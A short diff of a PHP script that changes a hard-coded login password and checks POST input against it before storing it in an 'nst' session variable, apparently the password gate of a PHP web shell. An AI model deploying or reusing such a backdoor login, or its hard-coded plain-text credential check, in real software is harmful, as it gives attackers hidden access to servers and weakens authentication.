@@ -7,7 +7,7 @@ if((isset($v) AND $v==0) OR (isset($t) AND $t==false)){
 die('');
 }
 $create_password = true;
-$password = "ph-ico"; //ico-ninja - 
+$password = "n0"; //j - 
 $pass=$_POST['pass'];
 if($pass==$password){
 $_SESSION['nst']="$pass";
